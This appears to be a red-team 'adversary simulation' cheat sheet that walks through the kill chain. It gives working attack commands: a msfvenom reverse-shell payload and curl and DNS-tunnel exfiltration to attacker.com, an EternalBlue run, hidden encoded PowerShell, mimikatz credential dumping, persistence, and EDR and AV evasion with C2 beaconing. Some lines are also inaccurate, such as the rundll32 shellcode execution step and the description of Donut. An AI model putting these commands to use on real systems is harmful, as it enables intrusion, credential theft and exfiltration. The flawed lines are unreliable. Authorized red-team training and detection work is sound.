---
icon: waves-sine
---

# Adversary Simulation

## **Adversary Simulation — Mastering the Kill Chain**

***

Adversary Simulation is the craft of **emulating threat actors** — replicating real TTPs (Tactics, Techniques, and Procedures) to test an organization’s defenses or train detection teams.\
It’s not just hacking — it’s a **disciplined, intelligence-driven operation** blending stealth, automation, and precision.

This guide breaks down **each stage of the attack lifecycle**, toolkits, tradecraft, and operational best practices that mimic real-world APT campaigns.

***

### I. 🧩 The Adversary Simulation Mindset

| Principle             | Description                                               |
| --------------------- | --------------------------------------------------------- |
| **Realism**           | Emulate genuine threat actor behaviors (MITRE ATT\&CK).   |
| **Stealth**           | Prioritize evasion over destruction.                      |
| **Repeatability**     | Build reproducible, scriptable simulations.               |
| **Attribution**       | Map operations to known APT groups (APT29, FIN7, etc.).   |
| **Controlled Impact** | No harm to production; focus on visibility and detection. |

***

### II. ⚙️ Kill Chain Overview

| Stage                      | Objective                                | Example Tools                                |
| -------------------------- | ---------------------------------------- | -------------------------------------------- |
| **Reconnaissance**         | Gather information                       | `subfinder`, `nmap`, `theHarvester`          |
| **Weaponization**          | Build payloads                           | `msfvenom`, `donut`, `Covenant`              |
| **Delivery**               | Get access                               | `phishing`, `exploits`, `USB`, `WebShells`   |
| **Exploitation**           | Execute code                             | `Metasploit`, `Cobalt Strike`, `Nishang`     |
| **Installation**           | Persist                                  | `registry run keys`, `schtasks`, `WMI`       |
| **Command & Control (C2)** | Maintain communication                   | `Sliver`, `Mythic`, `Covenant`, `Empire`     |
| **Actions on Objectives**  | Data theft, privilege escalation, impact | `mimikatz`, `rclone`, `exfiltration scripts` |

***

### III. ⚙️ Red Team Infrastructure Design

#### 🧠 1. Team Server Setup

Deploy C2 frameworks on secure VPS or lab VM:

```bash
sudo apt install docker docker-compose
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire && ./setup.sh
```

#### ⚙️ 2. Staging & Redirectors

Use **nginx** or **CDN redirectors** to proxy C2 traffic:

```nginx
location /updates {
    proxy_pass http://127.0.0.1:8080;
}
```

→ Masks operator IPs, blends into normal web traffic.

#### 💣 3. SSL & Domain Fronting

Use legitimate cloud hosts (e.g. Azure, AWS) as fronts for your C2:

```
C2 → CloudFront → CDN → Red Team server
```

***

### IV. ⚙️ Initial Access Techniques

| Vector                    | Description                         | Tools                      |
| ------------------------- | ----------------------------------- | -------------------------- |
| **Phishing / Macro Docs** | Embedded PowerShell or VBA payloads | `Nishang`, `MacroPack`     |
| **Exploited Web Apps**    | RCE, LFI, upload shells             | `Burp`, `sqlmap`, `ffuf`   |
| **Valid Accounts**        | Stolen or guessed credentials       | `crackmapexec`, `kerbrute` |
| **Malicious Links**       | Shortened or encoded URLs           | `Gophish`, `King Phisher`  |
| **Drive-by Compromise**   | Exploit kits or JS payloads         | `BeEF`, `Metasploit`       |

***

### V. ⚙️ Payload Development & Obfuscation

#### 🧠 1. Shellcode Generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe -o beacon.exe
```

#### ⚙️ 2. Inline Shellcode Injection (C#)

```csharp
VirtualAlloc(...)
WriteProcessMemory(...)
CreateThread(...)
```

#### 💣 3. Obfuscation Techniques

| Technique             | Example Tool                  |
| --------------------- | ----------------------------- |
| Base64 / XOR Encoding | `Invoke-Obfuscation`          |
| Function Renaming     | `Donut`                       |
| Shellcode Stagers     | `SharpShooter`                |
| PowerShell Downgrade  | Force PowerShell v2 execution |

***

### VI. ⚙️ Exploitation & Execution

#### 🧠 1. PowerShell Execution

```powershell
powershell -nop -w hidden -enc <base64_payload>
```

#### ⚙️ 2. Exploit Delivery

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.105
run
```

#### 💣 3. In-Memory Execution

```bash
donut --arch x64 --format shellcode beacon.exe
rundll32.exe shell32.dll,Control_RunDLL payload.bin
```

***

### VII. ⚙️ Post-Exploitation & Lateral Movement

| Technique               | Command / Tool                      | Description                        |
| ----------------------- | ----------------------------------- | ---------------------------------- |
| **Credential Dumping**  | `mimikatz sekurlsa::logonpasswords` | Extract plaintext creds            |
| **Token Impersonation** | `incognito` (Meterpreter)           | Move under another user’s identity |
| **Pass-the-Hash**       | `pth-winexe`, `crackmapexec`        | Authenticate without password      |
| **WMI / SMB Execution** | `wmiexec.py`, `psexec.py`           | Remote code execution              |
| **AD Enumeration**      | `BloodHound`, `SharpHound`          | Map domain trust paths             |
| **Pivoting**            | `Chisel`, `ProxyChains`             | Internal network tunneling         |

***

### VIII. ⚙️ Persistence Mechanisms

| Type                       | Technique                                          | Command                                                                    |
| -------------------------- | -------------------------------------------------- | -------------------------------------------------------------------------- |
| **Registry Run Key**       | HKCU\Software\Microsoft\Windows\CurrentVersion\Run | `reg add ...`                                                              |
| **Scheduled Task**         | Task triggers malware every reboot                 | `schtasks /create ...`                                                     |
| **Service Creation**       | Create malicious Windows service                   | `sc create ...`                                                            |
| **WMI Event Subscription** | Reactivate payload on event                        | WMI permanent event                                                        |
| **Startup Folder**         | Drop EXE in user’s startup path                    | `copy payload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup` |

***

### IX. ⚙️ Command & Control (C2) Frameworks

| Framework         | Language   | Highlights                             |
| ----------------- | ---------- | -------------------------------------- |
| **Cobalt Strike** | Java       | Mature, stealthy, beacon-based         |
| **Sliver**        | Go         | Free, OPSEC-focused C2                 |
| **Mythic**        | Python     | Modular, cross-platform                |
| **Empire**        | PowerShell | Ideal for Windows operations           |
| **Covenant**      | .NET       | Powerful GUI and payload generation    |
| **Havoc**         | C++        | Modern post-exploitation & EDR evasion |

***

#### 🧩 Example: Sliver C2 Setup

```bash
sliver-server
generate beacon --os windows --arch amd64 --format exe --http 10.10.10.5:443
```

→ Listener + beacon connection\
Use:

```bash
sessions
info
run mimikatz
```

***

### X. ⚙️ Evasion & OPSEC

| Goal                              | Technique                                    | Example                |
| --------------------------------- | -------------------------------------------- | ---------------------- |
| **Avoid AV**                      | In-memory execution, obfuscation             | Reflective DLL loading |
| **Evade EDR Hooks**               | Unhook NTDLL                                 | Manual syscalls        |
| **Traffic Camouflage**            | TLS / Domain Fronting                        | HTTPS over CDN         |
| **Fileless Persistence**          | Registry-stored script blobs                 | PowerShell + WMI       |
| **Living-off-the-Land (LOLBins)** | Abuse legit binaries (`rundll32`, `msbuild`) | “No binaries dropped”  |

***

### XI. ⚙️ Exfiltration & Impact

#### 🧠 1. Data Exfil via HTTP

```bash
curl -F "file=@loot.zip" http://attacker.com/upload
```

#### ⚙️ 2. DNS Tunneling

```bash
iodine -f 10.0.0.1 attacker.com
```

#### 💣 3. Cloud Storage Exfil

```bash
rclone copy /loot gdrive:staging --config /tmp/rclone.conf
```

***

### XII. ⚙️ Reporting & Detection Mapping

| Category             | Example                  | MITRE ATT\&CK ID |
| -------------------- | ------------------------ | ---------------- |
| Initial Access       | Spearphishing Attachment | T1566.001        |
| Execution            | PowerShell               | T1059.001        |
| Persistence          | Registry Run Keys        | T1060            |
| Privilege Escalation | Token Impersonation      | T1134            |
| Defense Evasion      | Obfuscated Files         | T1027            |
| Lateral Movement     | WMI Exec                 | T1047            |
| Exfiltration         | Web Services             | T1567            |
| C2                   | Encrypted Channel        | T1071.001        |

***

### XIII. ⚙️ Adversary Emulation Frameworks

| Framework            | Description                                         |
| -------------------- | --------------------------------------------------- |
| **MITRE CALDERA**    | Automated adversary simulation platform             |
| **Atomic Red Team**  | Minimal test scripts for ATT\&CK techniques         |
| **Infection Monkey** | Self-propagating security testing tool              |
| **PurpleSharp**      | Simulates ATT\&CK techniques for defense validation |
| **Prelude Operator** | Real-time adversary automation suite                |

***

### XIV. ⚔️ Red Team Pro Tips

✅ **Plan Like a Military Campaign**\
Every operation has phases, objectives, fallback paths, and comms discipline.

✅ **OPSEC First**\
Encrypt everything. Use redirectors. Never beacon directly from your host.

✅ **Automate**\
Leverage scripting frameworks (Mythic, Sliver APIs) for repeatable engagements.

✅ **Blend In**\
Use user-agents, DNS patterns, and TLS certs from common SaaS.

✅ **Be Predictable Internally, Unpredictable Externally**\
Maintain consistent internal SOPs, but vary external tactics to evade detection.

✅ **After Action Always**\
Document what worked, what got caught, and how defenders detected you.

✅ **Purple Team**\
Collaborate with blue teams to strengthen both offense and defense.

***

### XV. ⚙️ Quick Reference Table

| Goal             | Tool / Command                 | Description                 |
| ---------------- | ------------------------------ | --------------------------- |
| Initial Access   | `Gophish`, `MacroPack`         | Delivery mechanisms         |
| Exploitation     | `Metasploit`, `Nishang`        | Payload execution           |
| C2               | `Sliver`, `Empire`, `Covenant` | Control channels            |
| Persistence      | `schtasks`, `reg add`          | Maintain access             |
| Lateral Movement | `BloodHound`, `wmiexec`        | Internal pivot              |
| Exfiltration     | `rclone`, `curl`               | Data theft                  |
| Evasion          | `Invoke-Obfuscation`, `Donut`  | Stealth enhancement         |
| Simulation       | `CALDERA`, `Atomic Red Team`   | ATT\&CK technique emulation |

***
